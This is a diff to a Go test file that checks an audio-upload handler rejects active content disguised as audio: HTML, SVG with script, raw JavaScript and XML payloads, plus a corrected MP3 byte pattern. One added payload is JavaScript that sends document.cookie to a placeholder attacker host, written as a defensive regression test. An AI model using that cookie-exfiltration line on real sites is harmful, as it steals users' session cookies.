@@ -216,9 +216,16 @@ func TestTrackUseCase_UploadRejectsActiveContentDisguisedAsAudio(t *testing.T) {
 	// declared type, that file could later be served back and executed.
 	payloads := map[string]string{
 		"html":       "<!DOCTYPE html><html><body><script>alert(1)</script></body></html>",
-		"svg":        `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`,
 		"plain html": "<html><head><title>x</title></head><body>hi</body></html>",
 		"pdf":        "%PDF-1.4\n%\xe2\xe3\xcf\xd3\n1 0 obj",
+
+		// The four below all sniff as text/plain, and every one of them got
+		// through the first version of this check (see the review on PR #23).
+		// They are the regression guard for the blanket text/ rule.
+		"svg with xml prolog": `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`,
+		"bare svg, no prolog": `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`,
+		"raw javascript":      `(function(){fetch('https://evil.example/'+document.cookie)})();`,
+		"xml without prolog":  `<root><child>payload</child></root>`,
 	}
 
 	for name, payload := range payloads {
@@ -244,7 +251,11 @@ func TestTrackUseCase_UploadAcceptsAudioTheSnifferCannotIdentify(t *testing.T) {
 	// Whitelisting on the sniff would reject them — hence rejecting active
 	// content instead. This test pins that decision.
 	uc, _, store := newTrackUC(t)
-	rawMP3 := bytes.Repeat([]byte{0xFF, 0xFB, 0x90, 0x64}, 256) // frame headers, no ID3
+	// A realistic frame pattern: real MP3 frames carry bytes below 0x20 in
+	// their side-info, which is what makes them sniff as octet-stream. The
+	// first version of this test used only bytes >= 0x20, so its payload
+	// actually sniffed as text/plain — it was passing for the wrong reason.
+	rawMP3 := bytes.Repeat([]byte{0xFF, 0xFB, 0x90, 0x00, 0x0A, 0x11}, 128)
 
 	track, err := uc.Upload(context.Background(), validUpload(bytes.NewReader(rawMP3)))
 	if err != nil {
